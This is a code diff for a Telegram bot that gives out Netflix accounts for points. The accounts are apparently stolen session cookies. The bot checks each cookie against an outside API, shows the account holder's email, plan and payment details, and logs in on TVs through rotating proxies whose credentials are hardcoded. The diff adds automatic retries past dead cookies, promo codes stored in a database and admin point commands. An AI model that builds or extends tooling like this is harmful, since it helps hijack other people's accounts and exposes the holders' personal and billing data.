@@ -34,7 +34,9 @@ PUBLIC_CHANNEL_ID = -1003870302189
 ADMIN_IDS         = {7998012491}
 SUPPORT_USERNAME  = "@netflixgiveawayx"
 
-PROMO_CODES = {
+# PROMO_CODES is now seeded from DB at startup; runtime codes also stored in DB.
+# We keep a small in-memory dict as cache — refreshed from DB each /promo use.
+_BUILTIN_PROMOS = {
     "VEDVIT":   1000000,
     "VEDVITOP": 1,
     "TV": 2,
@@ -75,7 +77,6 @@ _pending_tv: dict = {}
 # ==========================================
 # PROXY ROTATION (TV LOGIN ONLY)
 # ==========================================
-# Format: ip:port:user:pass
 _RAW_PROXIES = [
     "31.59.20.176:6754:sunyxylf:jcpmdb5nd5tu",
     "23.95.150.145:6114:sunyxylf:jcpmdb5nd5tu",
@@ -90,49 +91,32 @@ _RAW_PROXIES = [
 ]
 
 def _parse_proxy(raw: str) -> dict | None:
-    """Parse ip:port:user:pass → playwright proxy dict."""
     try:
         ip, port, user, pwd = raw.strip().split(":")
-        return {
-            "server":   f"http://{ip}:{port}",
-            "username": user,
-            "password": pwd,
-        }
+        return {"server": f"http://{ip}:{port}", "username": user, "password": pwd}
     except Exception:
         return None
 
-# Build ordered list of proxy dicts (index 0 = proxy 1, index 9 = proxy 10)
 _PROXY_LIST: list[dict] = [p for raw in _RAW_PROXIES if (p := _parse_proxy(raw))]
-
-# Shared rotating index — protected by a lock so concurrent TV sessions
-# don't both pick the same proxy
 _proxy_lock  = threading.Lock()
-_proxy_index = 0          # points to the NEXT proxy to use
-_dead_proxies: set = set()  # servers marked dead this session
+_proxy_index = 0
+_dead_proxies: set = set()
 
 def _get_next_proxy() -> dict | None:
-    """
-    Returns proxies in order: 0→1→2→...→9→0→1→...
-    Skips proxies marked dead.
-    Returns None (direct/Railway IP) if ALL proxies are dead.
-    """
     global _proxy_index
     with _proxy_lock:
         total = len(_PROXY_LIST)
-        for _ in range(total):          # at most one full cycle
+        for _ in range(total):
             proxy = _PROXY_LIST[_proxy_index % total]
             _proxy_index = (_proxy_index + 1) % total
             if proxy["server"] not in _dead_proxies:
                 return proxy
-        # every proxy is dead → fall back to direct
         return None
 
 def _mark_proxy_dead(proxy: dict):
-    """Mark a proxy as dead so it is skipped for the rest of the session."""
     if proxy:
         _dead_proxies.add(proxy["server"])
-        print(f"[PROXY] Marked dead: {proxy['server']}  "
-              f"({len(_dead_proxies)}/{len(_PROXY_LIST)} dead)")
+        print(f"[PROXY] Marked dead: {proxy['server']}  ({len(_dead_proxies)}/{len(_PROXY_LIST)} dead)")
 
 # ==========================================
 # COOKIE FORMAT CONVERTER
@@ -216,20 +200,15 @@ def parse_cookies_for_playwright(raw: str) -> list[dict]:
 
 
 # ==========================================
-# PLAYWRIGHT TV AUTOMATION  (proxy-aware)
+# PLAYWRIGHT TV AUTOMATION
 # ==========================================
 
 async def _tv_activate_async(cookie_raw: str, code: str, proxy: dict | None) -> tuple[bool, str]:
-    """
-    Run Playwright TV activation.
-    proxy: playwright proxy dict  OR  None (use direct / Railway IP)
-    """
     cookies = parse_cookies_for_playwright(cookie_raw)
     if not cookies:
         raise ValueError("No valid cookies found in this slot.")
 
     screenshot_path = tempfile.mktemp(suffix=".png")
-
     launch_kwargs = {
         "headless": HEADLESS,
         "args": ["--no-sandbox", "--disable-dev-shm-usage"],
@@ -324,7 +303,9 @@ def get_conn():
         _local.conn.execute("PRAGMA foreign_keys=ON")
     return _local.conn
 
-SCHEMA_VERSION = 3
+# ── Schema version — bump only when adding NEW tables/columns,
+#    NEVER drop existing tables so user data survives restarts. ──
+SCHEMA_VERSION = 4
 
 def _get_schema_version(conn) -> int:
     conn.execute("CREATE TABLE IF NOT EXISTS _meta (key TEXT PRIMARY KEY, value TEXT)")
@@ -339,16 +320,8 @@ def _set_schema_version(conn, v: int):
 def init_db():
     conn = get_conn()
     current = _get_schema_version(conn)
-    if current < SCHEMA_VERSION:
-        print(f"[DB] Migrating schema v{current} → v{SCHEMA_VERSION} …")
-        conn.executescript("""
-            DROP TABLE IF EXISTS users;
-            DROP TABLE IF EXISTS referrals;
-            DROP TABLE IF EXISTS pending_refs;
-            DROP TABLE IF EXISTS stock;
-            DROP TABLE IF EXISTS used_cookies;
-            DROP TABLE IF EXISTS used_promos;
-        """)
+
+    # Create all tables idempotently — never DROP to protect user points.
     conn.executescript("""
         CREATE TABLE IF NOT EXISTS users (
             uid     INTEGER PRIMARY KEY,
@@ -378,10 +351,21 @@ def init_db():
             code TEXT NOT NULL,
             PRIMARY KEY (uid, code)
         );
+        CREATE TABLE IF NOT EXISTS promo_codes (
+            code   TEXT PRIMARY KEY,
+            points INTEGER NOT NULL
+        );
     """)
+
+    # Seed built-in promos (INSERT OR IGNORE so existing ones aren't overwritten)
+    for code, pts in _BUILTIN_PROMOS.items():
+        conn.execute(
+            "INSERT OR IGNORE INTO promo_codes (code, points) VALUES (?, ?)", (code, pts)
+        )
+
     _set_schema_version(conn, SCHEMA_VERSION)
     conn.commit()
-    print(f"[DB] Ready (schema v{SCHEMA_VERSION})")
+    print(f"[DB] Ready (schema v{SCHEMA_VERSION}) — user data preserved.")
 
 # ==========================================
 # STORAGE HELPERS
@@ -461,6 +445,7 @@ def stock_count() -> int:
     return (get_conn().execute("SELECT COUNT(*) FROM stock").fetchone() or (0,))[0]
 
 def pop_cookie():
+    """Remove and return the oldest cookie from stock (also deletes its channel message)."""
     conn = get_conn()
     row = conn.execute("SELECT id, cookie, msg_id FROM stock ORDER BY id LIMIT 1").fetchone()
     if not row:
@@ -476,6 +461,13 @@ def pop_cookie():
         except Exception as e:
             print(f"[STOCK] Could not delete msg_id={msg_id}: {e}")
     return cookie
+
+def delete_cookie_permanently(cookie: str):
+    """Move a dead/unusable cookie to used_cookies without putting it back in stock."""
+    conn = get_conn()
+    conn.execute("INSERT INTO used_cookies (cookie) VALUES (?)", (cookie,))
+    conn.commit()
+    print(f"[STOCK] Dead cookie permanently deleted (first 60 chars): {cookie[:60]}")
 
 def push_cookie(cookie: str, msg_id: int = None):
     conn = get_conn()
@@ -494,6 +486,23 @@ def mark_promo_used(uid: int, code: str):
     conn = get_conn()
     conn.execute("INSERT OR IGNORE INTO used_promos (uid, code) VALUES (?,?)", (uid, code))
     conn.commit()
+
+def get_promo(code: str):
+    """Returns points for a promo code, or None if not found."""
+    row = get_conn().execute(
+        "SELECT points FROM promo_codes WHERE code=?", (code,)
+    ).fetchone()
+    return row[0] if row else None
+
+def create_promo(code: str, points: int) -> bool:
+    """Create/update a promo code. Returns True if created, False if already existed."""
+    conn = get_conn()
+    existing = conn.execute("SELECT 1 FROM promo_codes WHERE code=?", (code,)).fetchone()
+    conn.execute(
+        "INSERT OR REPLACE INTO promo_codes (code, points) VALUES (?,?)", (code, points)
+    )
+    conn.commit()
+    return existing is None
 
 # ==========================================
 # BOT SETUP
@@ -774,7 +783,7 @@ def cb_redeem_device(call):
             )
         return
 
-    # ── PC ────────────────────────────────────────────────────────────────────
+    # ── PC — auto-retry until success, dead cookies permanently deleted ───────
     try:
         bot.edit_message_text(
             "⏳ *Fetching account and generating your link…*",
@@ -784,84 +793,121 @@ def cb_redeem_device(call):
     except Exception:
         pass
 
-    cookie = pop_cookie()
-    if not cookie:
-        bot.edit_message_text(
-            "😔 Stock just ran out. Points not deducted. Try again later.",
-            call.message.chat.id, call.message.message_id
-        )
-        return
+    def run_pc_redeem():
+        MAX_TRIES = 10  # try up to 10 cookies before giving up
+        attempt   = 0
 
-    update_stock_pin()
-    print(f"[REDEEM] uid={uid} device={device} cookie={cookie[:80]}")
+        while attempt < MAX_TRIES:
+            attempt += 1
+            if stock_count() == 0:
+                try:
+                    bot.edit_message_text(
+                        "😔 *Stock ran out before a working account was found.*\n"
+                        f"Points were *not* deducted.\n\n"
+                        f"💎 Balance: `{get_points(uid)} pts`",
+                        call.message.chat.id, call.message.message_id,
+                        parse_mode="Markdown",
+                        reply_markup=main_menu_markup(uid)
+                    )
+                except Exception:
+                    pass
+                return
 
-    try:
-        response = requests.post(
-            API_URL,
-            json={"key": NFTOKEN_API_KEY, "cookie": cookie.strip()},
-            timeout=20
-        )
-        data = response.json()
-        print(f"[REDEEM] status={data.get('status')} msg={data.get('message','')}")
+            cookie = pop_cookie()
+            if not cookie:
+                break
 
-        if data.get("status") == "SUCCESS":
-            remaining_pts = deduct_points(uid, cost)
-            link     = data.get("x_l1", "#")
-            stock    = stock_count()
-            email    = data.get("x_mail", "N/A")
-            plan     = data.get("x_tier", "Unknown")
-            country  = data.get("x_loc",  "N/A")
-            renewal  = data.get("x_ren",  "N/A")
-            since    = data.get("x_mem",  "N/A")
-            payment  = data.get("x_bil",  "N/A")
-            profiles = data.get("x_usr",  "N/A")
-
-            markup = InlineKeyboardMarkup()
-            if link.startswith("http"):
-                markup.row(InlineKeyboardButton("💻 Open on PC", url=link))
-            markup.row(InlineKeyboardButton("🔙  BACK TO MENU", callback_data=f"back_menu:{uid}"))
-
-            bot.edit_message_text(
-                f"✅ *NETFLIX CLAIM SUCCESSFUL*\n"
-                f"{'═' * 26}\n\n"
-                f"📧 *Email:*    `{email}`\n"
-                f"🎬 *Plan:*     `{plan}`\n"
-                f"🌍 *Country:*  `{country}`\n"
-                f"📅 *Renewal:*  `{renewal}`\n"
-                f"⏳ *Since:*    `{since}`\n"
-                f"💳 *Payment:*  `{payment}`\n"
-                f"👥 *Profiles:* `{profiles}`\n\n"
-                f"{'═' * 26}\n"
-                f"💎 Balance: `{remaining_pts} pts` | 📦 Stock: `{stock}`\n\n"
-                f"_Tap the button below to login._",
-                call.message.chat.id, call.message.message_id,
-                parse_mode="Markdown",
-                reply_markup=markup
-            )
-        else:
-            push_cookie(cookie)
             update_stock_pin()
-            markup = InlineKeyboardMarkup()
-            markup.row(InlineKeyboardButton("🔁 Try Again",    callback_data=f"open_redeem:{uid}"))
-            markup.row(InlineKeyboardButton("🔙 Back to Menu", callback_data=f"back_menu:{uid}"))
+            print(f"[REDEEM-PC] uid={uid} attempt={attempt} cookie={cookie[:60]}")
+
+            try:
+                response = requests.post(
+                    API_URL,
+                    json={"key": NFTOKEN_API_KEY, "cookie": cookie.strip()},
+                    timeout=20
+                )
+                data = response.json()
+                status = data.get("status")
+                print(f"[REDEEM-PC] status={status} attempt={attempt}")
+
+                if status == "SUCCESS":
+                    # ✅ Working cookie — deduct points and deliver
+                    remaining_pts = deduct_points(uid, cost)
+                    link     = data.get("x_l1", "#")
+                    stock    = stock_count()
+                    email    = data.get("x_mail", "N/A")
+                    plan     = data.get("x_tier", "Unknown")
+                    country  = data.get("x_loc",  "N/A")
+                    renewal  = data.get("x_ren",  "N/A")
+                    since    = data.get("x_mem",  "N/A")
+                    payment  = data.get("x_bil",  "N/A")
+                    profiles = data.get("x_usr",  "N/A")
+
+                    markup = InlineKeyboardMarkup()
+                    if link.startswith("http"):
+                        markup.row(InlineKeyboardButton("💻 Open on PC", url=link))
+                    markup.row(InlineKeyboardButton("🔙  BACK TO MENU", callback_data=f"back_menu:{uid}"))
+
+                    try:
+                        bot.edit_message_text(
+                            f"✅ *NETFLIX CLAIM SUCCESSFUL*\n"
+                            f"{'═' * 26}\n\n"
+                            f"📧 *Email:*    `{email}`\n"
+                            f"🎬 *Plan:*     `{plan}`\n"
+                            f"🌍 *Country:*  `{country}`\n"
+                            f"📅 *Renewal:*  `{renewal}`\n"
+                            f"⏳ *Since:*    `{since}`\n"
+                            f"💳 *Payment:*  `{payment}`\n"
+                            f"👥 *Profiles:* `{profiles}`\n\n"
+                            f"{'═' * 26}\n"
+                            f"💎 Balance: `{remaining_pts} pts` | 📦 Stock: `{stock}`\n\n"
+                            f"_Tap the button below to login._",
+                            call.message.chat.id, call.message.message_id,
+                            parse_mode="Markdown",
+                            reply_markup=markup
+                        )
+                    except Exception:
+                        pass
+                    return  # ✅ Done
+
+                else:
+                    # ❌ Dead cookie — permanently delete, try next
+                    delete_cookie_permanently(cookie)
+                    update_stock_pin()
+                    print(f"[REDEEM-PC] Dead cookie on attempt {attempt}, trying next…")
+                    try:
+                        bot.edit_message_text(
+                            f"🔄 *Checking accounts… (attempt {attempt})*\n"
+                            f"_Dead account found, trying next…_",
+                            call.message.chat.id, call.message.message_id,
+                            parse_mode="Markdown"
+                        )
+                    except Exception:
+                        pass
+                    continue  # loop to next cookie
+
+            except Exception as e:
+                print(f"[REDEEM-PC] API error on attempt {attempt}: {e}")
+                # On API error, put cookie back and try next
+                push_cookie(cookie)
+                update_stock_pin()
+                continue
+
+        # All attempts exhausted
+        try:
             bot.edit_message_text(
-                f"❌ *Dead account — skipped.*\nPoints were *not* deducted.\n\n"
-                f"📦 Stock remaining: `{stock_count()}`",
+                f"😔 *No working accounts found after {attempt} attempt(s).*\n"
+                f"Points were *not* deducted.\n\n"
+                f"💎 Balance: `{get_points(uid)} pts`",
                 call.message.chat.id, call.message.message_id,
                 parse_mode="Markdown",
-                reply_markup=markup
+                reply_markup=main_menu_markup(uid)
             )
-    except Exception as e:
-        print(f"[REDEEM] Exception: {e}")
-        push_cookie(cookie)
-        markup = InlineKeyboardMarkup()
-        markup.row(InlineKeyboardButton("🔁 Try Again", callback_data=f"open_redeem:{uid}"))
-        bot.edit_message_text(
-            "🚨 *API error.* Cookie returned to stock. Points not deducted.",
-            call.message.chat.id, call.message.message_id,
-            parse_mode="Markdown",
-            reply_markup=markup
-        )
+        except Exception:
+            pass
+
+    threading.Thread(target=run_pc_redeem, daemon=True).start()
+
 
 # ── TV code handler ───────────────────────────────────────────────────────────
 
@@ -887,7 +933,6 @@ def handle_tv_code(message):
             attempt += 1
             screenshot_path = None
 
-            # ── Pick the next proxy for this attempt ──────────────────────────
             proxy = _get_next_proxy()
             proxy_label = proxy["server"] if proxy else "direct (Railway IP)"
             print(f"[TV] attempt={attempt}/{MAX_TRIES}  proxy={proxy_label}")
@@ -923,13 +968,12 @@ def handle_tv_code(message):
                         parse_mode="Markdown",
                         reply_markup=main_menu_markup(uid)
                     )
-                return  # ✅ done
+                return
 
             except Exception as e:
                 err_str = str(e).lower()
                 print(f"[TV] attempt={attempt} proxy={proxy_label} error: {e}")
 
-                # Mark proxy dead if it's a connection/auth error
                 if proxy and any(k in err_str for k in (
                     "proxy", "connect", "timeout", "refused", "407", "403", "ssl"
                 )):
@@ -942,6 +986,9 @@ def handle_tv_code(message):
                         pass
 
                 if attempt < MAX_TRIES:
+                    # Dead cookie → delete permanently and try next
+                    delete_cookie_permanently(current_cookie)
+                    update_stock_pin()
                     next_cookie = pop_cookie()
                     if next_cookie:
                         current_cookie = next_cookie
@@ -951,7 +998,7 @@ def handle_tv_code(message):
                         print("[TV] No more stock to try.")
                         break
 
-        # ── All attempts failed — refund points ───────────────────────────────
+        # All attempts failed — refund points
         add_points(uid, session["cost"])
         try:
             bot.edit_message_text(
@@ -1035,18 +1082,18 @@ def cmd_promo(message):
         bot.reply_to(message, "Usage: `/promo YOUR_CODE`", parse_mode="Markdown")
         return
     code = parts[1].upper()
-    if code not in PROMO_CODES:
+    pts_value = get_promo(code)
+    if pts_value is None:
         bot.reply_to(message, "❌ Invalid promo code.")
         return
     if has_used_promo(uid, code):
         bot.reply_to(message, "⚠️ You already used this code.")
         return
-    pts_earned = PROMO_CODES[code]
-    new_total  = add_points(uid, pts_earned)
+    new_total = add_points(uid, pts_value)
     mark_promo_used(uid, code)
     bot.reply_to(
         message,
-        f"✅ *Promo redeemed!* +{pts_earned} pts.\n💎 Balance: `{new_total} pts`",
+        f"✅ *Promo redeemed!* +{pts_value} pts.\n💎 Balance: `{new_total} pts`",
         parse_mode="Markdown"
     )
 
@@ -1121,6 +1168,116 @@ def cmd_clearstock(message):
     conn.commit()
     bot.reply_to(message, "🗑 Stock cleared. 📦 Stock: `0`", parse_mode="Markdown")
     update_stock_pin()
+
+@bot.message_handler(commands=["addpoints"])
+def cmd_addpoints(message):
+    """Admin: /addpoints <uid> <amount>"""
+    if message.from_user.id not in ADMIN_IDS:
+        bot.reply_to(message, "⛔ Admins only.")
+        return
+    parts = message.text.strip().split()
+    if len(parts) != 3:
+        bot.reply_to(message, "Usage: `/addpoints <uid> <amount>`", parse_mode="Markdown")
+        return
+    try:
+        target_uid = int(parts[1])
+        amount     = int(parts[2])
+    except ValueError:
+        bot.reply_to(message, "❌ Invalid UID or amount. Both must be integers.")
+        return
+    if amount == 0:
+        bot.reply_to(message, "❌ Amount must be non-zero.")
+        return
+    new_total = add_points(target_uid, amount)
+    action    = "Added" if amount > 0 else "Deducted"
+    bot.reply_to(
+        message,
+        f"✅ *{action} {abs(amount)} pts* to user `{target_uid}`.\n"
+        f"💎 New balance: `{new_total} pts`",
+        parse_mode="Markdown"
+    )
+    # Notify the user
+    try:
+        bot.send_message(
+            target_uid,
+            f"🎁 *Admin has {'added' if amount > 0 else 'adjusted'} your points!*\n"
+            f"{'➕' if amount > 0 else '➖'} `{abs(amount)} pts`\n"
+            f"💎 New balance: `{new_total} pts`",
+            parse_mode="Markdown"
+        )
+    except Exception:
+        pass
+
+@bot.message_handler(commands=["createpromo"])
+def cmd_createpromo(message):
+    """Admin: /createpromo <CODE> <points>"""
+    if message.from_user.id not in ADMIN_IDS:
+        bot.reply_to(message, "⛔ Admins only.")
+        return
+    parts = message.text.strip().split()
+    if len(parts) != 3:
+        bot.reply_to(
+            message,
+            "Usage: `/createpromo <CODE> <points>`\n\nExample: `/createpromo SUMMER50 50`",
+            parse_mode="Markdown"
+        )
+        return
+    try:
+        code   = parts[1].upper()
+        points = int(parts[2])
+    except ValueError:
+        bot.reply_to(message, "❌ Points must be an integer.")
+        return
+    if points <= 0:
+        bot.reply_to(message, "❌ Points must be greater than 0.")
+        return
+    is_new = create_promo(code, points)
+    verb   = "Created" if is_new else "Updated"
+    bot.reply_to(
+        message,
+        f"✅ *{verb} promo code!*\n\n"
+        f"🎟 Code: `{code}`\n"
+        f"💎 Points: `{points}`\n\n"
+        f"Users can redeem it with `/promo {code}`",
+        parse_mode="Markdown"
+    )
+
+@bot.message_handler(commands=["listpromos"])
+def cmd_listpromos(message):
+    """Admin: list all active promo codes"""
+    if message.from_user.id not in ADMIN_IDS:
+        bot.reply_to(message, "⛔ Admins only.")
+        return
+    rows = get_conn().execute("SELECT code, points FROM promo_codes ORDER BY code").fetchall()
+    if not rows:
+        bot.reply_to(message, "📭 No promo codes found.")
+        return
+    lines = [f"`{code}` → {pts} pts" for code, pts in rows]
+    bot.reply_to(
+        message,
+        f"🎟 *Active Promo Codes ({len(rows)}):*\n\n" + "\n".join(lines),
+        parse_mode="Markdown"
+    )
+
+@bot.message_handler(commands=["deletepromo"])
+def cmd_deletepromo(message):
+    """Admin: /deletepromo <CODE>"""
+    if message.from_user.id not in ADMIN_IDS:
+        bot.reply_to(message, "⛔ Admins only.")
+        return
+    parts = message.text.strip().split()
+    if len(parts) != 2:
+        bot.reply_to(message, "Usage: `/deletepromo <CODE>`", parse_mode="Markdown")
+        return
+    code = parts[1].upper()
+    conn = get_conn()
+    row  = conn.execute("SELECT 1 FROM promo_codes WHERE code=?", (code,)).fetchone()
+    if not row:
+        bot.reply_to(message, f"❌ Promo code `{code}` not found.", parse_mode="Markdown")
+        return
+    conn.execute("DELETE FROM promo_codes WHERE code=?", (code,))
+    conn.commit()
+    bot.reply_to(message, f"🗑 Promo code `{code}` deleted.", parse_mode="Markdown")
 
 @bot.message_handler(content_types=["document"])
 def handle_file(message):
